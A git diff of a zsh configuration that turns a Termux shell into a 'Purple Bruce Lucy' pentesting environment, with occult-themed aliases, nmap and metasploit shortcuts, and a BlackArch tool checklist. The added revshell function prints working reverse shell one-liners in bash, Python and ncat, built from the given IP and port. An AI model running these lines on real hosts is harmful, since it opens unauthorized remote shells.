@@ -1,21 +1,14 @@
-# ================================
-# Enhanced Cyberpunk Zsh Config
-# ================================
+# ╔══════════════════════════════════════════════════════════════╗
+# ║  PURPLE BRUCE LUCY — Chaos Magic ZSH Environment v6.0       ║
+# ║  Eastern Orthodox · Wicca · Chaos Magic · Purple Team        ║
+# ╚══════════════════════════════════════════════════════════════╝
 
-# Oh-My-Zsh Path
+# ── Oh-My-Zsh ────────────────────────────────────────────────────
 export ZSH="$HOME/.oh-my-zsh"
-
-# Theme
 ZSH_THEME="powerlevel10k/powerlevel10k"
-
-# Disable updates (Termux safe)
 DISABLE_AUTO_UPDATE="true"
 DISABLE_AUTO_TITLE="true"
-DISABLE_ZSH_COMPLTION_WIZARD="true"
 
-# ================================
-# Plugins
-# ================================
 plugins=(
   git
   sudo
@@ -23,44 +16,127 @@ plugins=(
   extract
   zsh-autosuggestions
   zsh-syntax-highlighting
-  zsh-completions
-  fzf
-  zoxide
 )
 
-# ================================
-# Load Oh My Zsh
-# ================================
 [[ -f "$ZSH/oh-my-zsh.sh" ]] && source "$ZSH/oh-my-zsh.sh"
+[[ -f "$HOME/.p10k.zsh" ]]   && source "$HOME/.p10k.zsh"
 
-# Powerlevel10k config
-[[ -f "$HOME/.p10k.zsh" ]] && source "$HOME/.p10k.zsh"
+# ── NVM ──────────────────────────────────────────────────────────
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
 
-# ================================
-# FIX: completions (WICHTIG!)
-# ================================
-[ -d "$ZSH_CUSTOM/plugins/zsh-completions/src" ] && fpath+=("$ZSH_CUSTOM/plugins/zsh-completions/src")
+# ── PATH ─────────────────────────────────────────────────────────
+export PATH="$HOME/.local/bin:$HOME/bin:$PATH"
 
+# ── ENVIRONMENT ──────────────────────────────────────────────────
+export COLORTERM=truecolor
+export TERM=xterm-256color
+export EDITOR=vim
+export LANG=en_US.UTF-8
+printf '\e[?12;25h'
+
+# ── COMPLETION ───────────────────────────────────────────────────
 autoload -U compinit && compinit -u
+zstyle ':completion:*' menu select
+setopt HIST_IGNORE_DUPS SHARE_HISTORY
+HISTSIZE=10000; SAVEHIST=10000; HISTFILE=~/.zsh_history
 
-# ================================
-# Purple Bruce — Drop-In Aliases
-# ================================
+# ── SYNTAX HIGHLIGHTING COLORS ───────────────────────────────────
+ZSH_HIGHLIGHT_HIGHLIGHTERS=(main)
+ZSH_HIGHLIGHT_STYLES[command]='fg=51'
+ZSH_HIGHLIGHT_STYLES[alias]='fg=201'
+ZSH_HIGHLIGHT_STYLES[builtin]='fg=220'
+ZSH_HIGHLIGHT_STYLES[function]='fg=46'
+ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=240"
+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║  PURPLE BRUCE LUCY — ALIASES                                 ║
+# ╚══════════════════════════════════════════════════════════════╝
+
+# ── Purple Bruce ─────────────────────────────────────────────────
 alias pb='netrunner'
+alias lucy='netrunner'
 alias purple='netrunner'
+alias bruce='netrunner'
 alias start='netrunner start'
-alias stop='pkill -f "node server.js" && echo "Purple Bruce stopped." || echo "Not running."'
+alias stop='pkill -f "node server.js" 2>/dev/null && echo "[✔] Server stopped." || echo "[⚠] Not running."'
+alias restart='stop; sleep 1; start'
 alias logs='tail -f ~/.purplebruce/audit.log'
-alias chat='~/purplebruce/purplebruce.sh tui'
 alias doctor='netrunner doctor'
 alias deck='netrunner deck'
+alias team='netrunner team'
 alias overclock='netrunner overclock'
 alias scan='netrunner scan'
-alias team='netrunner team'
 
-# ================================
-# Git
-# ================================
+# ── Occult Arsenal ───────────────────────────────────────────────
+alias sigil='python3 ~/purplebruce/netrunner/occult/sigil.py'
+alias moon='python3 ~/purplebruce/netrunner/occult/moon.py'
+alias tarot='python3 ~/purplebruce/netrunner/occult/tarot.py'
+alias rune='python3 ~/purplebruce/netrunner/occult/rune.py'
+alias ritual='python3 ~/purplebruce/netrunner/occult/ritual.py'
+alias intent='python3 ~/purplebruce/netrunner/occult/sigil.py'
+
+# ── Hacking Shortcuts ────────────────────────────────────────────
+alias nq='nmap -T4 -F'
+alias nfull='nmap -T4 -A -p-'
+alias nstealth='nmap -sS -T2 -p-'
+alias nse='ls /usr/share/nmap/scripts/ | grep'
+alias msfq='msfconsole -q'
+alias se='searchsploit'
+alias myip='curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo unknown'
+alias ports='ss -tlnp'
+alias listening='ss -tlnp'
+alias pyhttp='python3 -m http.server'
+alias toolcheck='
+echo "\n  \e[38;5;135m[BlackArch Arsenal Check]\e[0m\n"
+_tools=(
+  "nmap:recon" "masscan:recon" "zmap:recon" "hping3:recon" "arp-scan:recon"
+  "ffuf:web" "gobuster:web" "feroxbuster:web" "nikto:web" "whatweb:web"
+  "nuclei:vuln" "subfinder:osint" "httpx:web" "katana:web"
+  "sqlmap:exploit" "commix:exploit" "dalfox:exploit" "xsstrike:exploit"
+  "theharvester:osint" "amass:osint" "recon-ng:osint" "sherlock:osint"
+  "hydra:password" "hashcat:password" "john:password" "medusa:password"
+  "msfconsole:exploit" "msfvenom:exploit" "searchsploit:exploit"
+  "crackmapexec:windows" "evil-winrm:windows" "impacket-smbclient:windows" "kerbrute:windows"
+  "bloodhound:windows" "smbmap:windows" "enum4linux:windows"
+  "pwncat:post-ex" "chisel:post-ex" "ligolo-ng:post-ex" "socat:post-ex"
+  "radare2:rev-eng" "gdb:rev-eng" "ropper:rev-eng"
+  "wireshark:forensics" "tshark:forensics" "binwalk:forensics" "exiftool:forensics"
+  "steghide:stego" "zsteg:stego" "aircrack-ng:wireless" "wifite:wireless"
+)
+declare -A cats
+for entry in "${_tools[@]}"; do
+  t="${entry%%:*}"; c="${entry##*:}"
+  if command -v "$t" >/dev/null 2>&1; then
+    printf "  \e[32m✔\e[0m \e[38;5;51m%-22s\e[0m \e[38;5;240m%s\e[0m\n" "$t" "$c"
+  else
+    printf "  \e[31m✘\e[0m \e[38;5;240m%-22s %s\e[0m\n" "$t" "$c"
+  fi
+done
+echo "\n  \e[38;5;240mpacman -S blackarch-<category>  or  pacman -S <toolname>\e[0m\n"
+'
+alias ba='pacman -Ss blackarch'
+alias pac='pacman -S --noconfirm --needed'
+
+# ── General ──────────────────────────────────────────────────────
+alias ls='ls --color=auto -F'
+alias ll='ls -lah --color=auto'
+alias la='ls -lAh --color=auto'
+alias grep='grep --color=auto'
+alias ..='cd ..'
+alias ...='cd ../..'
+alias vi='vim'
+alias c='clear'
+alias cls='clear'
+
+# ── tmux ─────────────────────────────────────────────────────────
+alias t='tmux'
+alias tn='tmux new -s'
+alias ta='tmux attach -t'
+alias tl='tmux list-sessions'
+alias tk='tmux kill-session -t'
+
+# ── Git ──────────────────────────────────────────────────────────
 alias gs='git status'
 alias gp='git push'
 alias gl='git pull'
@@ -68,58 +144,87 @@ alias gd='git diff'
 alias ga='git add'
 alias gc='git commit'
 alias gco='git checkout'
-alias gb='git branch'
 
-# Directory
-alias ll='ls -la'
-alias la='ls -A'
-alias lt='ls -lt'
+# ╔══════════════════════════════════════════════════════════════╗
+# ║  FUNCTIONS                                                   ║
+# ╚══════════════════════════════════════════════════════════════╝
 
-# Utilities
-alias ports='netstat -tulnp 2>/dev/null'
-alias myip='curl ifconfig.me'
-alias weather='curl wttr.in'
-alias please='sudo'
+# Nmap shortcuts
+nq()      { nmap -T4 -F "${1:-localhost}"; }
+nfull()   { nmap -T4 -A -p- "${1:-localhost}"; }
+nstealth(){ nmap -sS -T2 -p- "${1:-localhost}"; }
 
-# ================================
-# MOTD (Layer 2 banner: fastfetch → motd.sh fallback)
-# ================================
-if [ -x "$HOME/.netrunner/fastfetch-launcher.sh" ]; then
-    bash "$HOME/.netrunner/fastfetch-launcher.sh"
-elif [ -f "$HOME/.netrunner/motd.sh" ]; then
-    bash "$HOME/.netrunner/motd.sh"
-fi
+# HTTP server
+serve() { python3 -m http.server "${1:-8080}"; }
 
-# ================================
-# Prompt Enhancements
-# ================================
+# Base64
+b64e() { echo -n "$1" | base64; }
+b64d() { echo -n "$1" | base64 -d; }
+sha()  { echo -n "$1" | sha256sum; }
 
-# Clock right side
-POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(time)
+# Extract any archive
+extract() {
+  case "$1" in
+    *.tar.gz|*.tgz) tar -xzf "$1" ;;
+    *.tar.bz2)      tar -xjf "$1" ;;
+    *.zip)          unzip "$1" ;;
+    *.7z)           7z x "$1" ;;
+    *.gz)           gunzip "$1" ;;
+    *.rar)          unrar x "$1" ;;
+    *)              echo "Unknown: $1" ;;
+  esac
+}
 
-# Execution time
-ZSH_COMMAND_EXECUTION_TIME="500"
+# Quick port check
+portcheck() { nmap -p "$1" "${2:-localhost}" 2>/dev/null | grep -E "open|closed|filtered"; }
 
-# Cursor blink (Termux supported)
-printf '\e[?12;25h'
+# Reverse shell helper
+revshell() {
+  local ip="${1:-$(hostname -I | awk '{print $1}')}"
+  local port="${2:-4444}"
+  echo "\n[Reverse Shell Listeners]"
+  echo "  bash:    bash -i >& /dev/tcp/$ip/$port 0>&1"
+  echo "  python:  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+  echo "  nc:      ncat $ip $port -e /bin/bash"
+  echo "\n  Listener: ncat -lvnp $port"
+}
 
-# ================================
-# Syntax Highlighting
-# ================================
-ZSH_HIGHLIGHT_HIGHLIGHTERS=(main git command alias builtin function)
+# ╔══════════════════════════════════════════════════════════════╗
+# ║  CHAOS MAGIC BANNER — shown on shell start                  ║
+# ╚══════════════════════════════════════════════════════════════╝
+_pb_banner() {
+  local V=$'\e[38;5;135m'  # violet
+  local C=$'\e[38;5;51m'   # cyan
+  local G=$'\e[38;5;46m'   # green
+  local Y=$'\e[38;5;220m'  # gold
+  local M=$'\e[38;5;201m'  # magenta
+  local D=$'\e[38;5;240m'  # dim
+  local W=$'\e[1;37m'      # white bold
+  local RS=$'\e[0m'
 
-ZSH_HIGHLIGHT_STYLES[command]='cyan'
-ZSH_HIGHLIGHT_STYLES[alias]='magenta'
-ZSH_HIGHLIGHT_STYLES[builtin]='yellow'
-ZSH_HIGHLIGHT_STYLES[function]='green'
-
-# ================================
-# FZF Colors
-# ================================
-export FZF_DEFAULT_OPTS="--color=bg+:cyan,fg:white"
-
-# ================================
-# TERMUX / TRUECOLOR FIX
-# ================================
-export COLORTERM=truecolor
-export TERM=xterm-256color
+  echo ""
+  echo "  ${V}╭────────────────────────────────────────────╮${RS}"
+  echo "  ${V}│${RS}                                            ${V}│${RS}"
+  echo "  ${V}│${RS}  ${M}⛧${RS}  ${W}PURPLE BRUCE LUCY${RS}  ${D}v6.0${RS}  ${M}⛧${RS}           ${V}│${RS}"
+  echo "  ${V}│${RS}  ${D}Chaos Magic · Purple Team · Hacker${RS}      ${V}│${RS}"
+  echo "  ${V}│${RS}  ${D}Eastern Orthodox · Wicca · Servitor${RS}     ${V}│${RS}"
+  echo "  ${V}│${RS}                                            ${V}│${RS}"
+  echo "  ${V}│${RS}  ${Y}⬡${RS}  ${C}Sigil:${RS} Ouroboros-Caduceus              ${V}│${RS}"
+  echo "  ${V}│${RS}  ${Y}⬡${RS}  ${C}Arch${RS} + BlackArch proot  ${D}[LAYER 2]${RS}   ${V}│${RS}"
+  echo "  ${V}│${RS}                                            ${V}│${RS}"
+  echo "  ${V}╰────────────────────────────────────────────╯${RS}"
+  echo ""
+  # Moon phase — inline
+  python3 ~/purplebruce/netrunner/occult/moon.py 2>/dev/null | sed "s/^/  /"
+  echo ""
+  echo "  ${G}⚡${RS} ${W}start${RS}     ${D}→ launch server (tmux)${RS}"
+  echo "  ${G}⚡${RS} ${W}lucy${RS}      ${D}→ netrunner menu${RS}"
+  echo "  ${Y}⬡${RS} ${W}sigil${RS}     ${D}→ sigil generator${RS}"
+  echo "  ${Y}⬡${RS} ${W}tarot${RS}     ${D}→ tarot draw${RS}"
+  echo "  ${Y}⬡${RS} ${W}moon${RS}      ${D}→ moon phase${RS}"
+  echo "  ${Y}⬡${RS} ${W}rune${RS}      ${D}→ rune cast${RS}"
+  echo "  ${D}──────────────────────────────${RS}"
+  echo "  ${C}toolcheck${RS}  ${D}→ verify BlackArch arsenal${RS}"
+  echo ""
+}
+_pb_banner
